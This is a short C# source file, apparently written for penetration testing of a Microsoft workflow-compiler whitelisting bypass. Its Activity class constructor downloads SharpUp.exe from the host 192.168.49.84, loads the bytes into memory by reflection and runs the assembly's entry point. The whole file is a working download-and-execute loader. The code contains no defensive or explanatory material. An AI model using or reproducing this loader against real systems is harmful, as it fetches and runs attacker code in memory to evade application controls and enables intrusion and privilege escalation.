using System;
using System.Net;
using System.Reflection;
using System.Workflow.ComponentModel;

namespace workflow_compiler_dl_and_exec_remote_cs
{
    public class Run : Activity
    {
        public Run()
        {
            // Download EXE from remote system
            string url = "http://192.168.49.84/SharpUp.exe";
            WebClient client = new WebClient();
            byte[] data = client.DownloadData(url);

            // Load DLL into memory using Reflection
            Assembly a = Assembly.Load(data);

            // Invoke Main method passing emtpy string[] args
            MethodInfo entryPoint = a.EntryPoint;
            entryPoint.Invoke(null, new object[] { new string[0] });
        }
    }
}
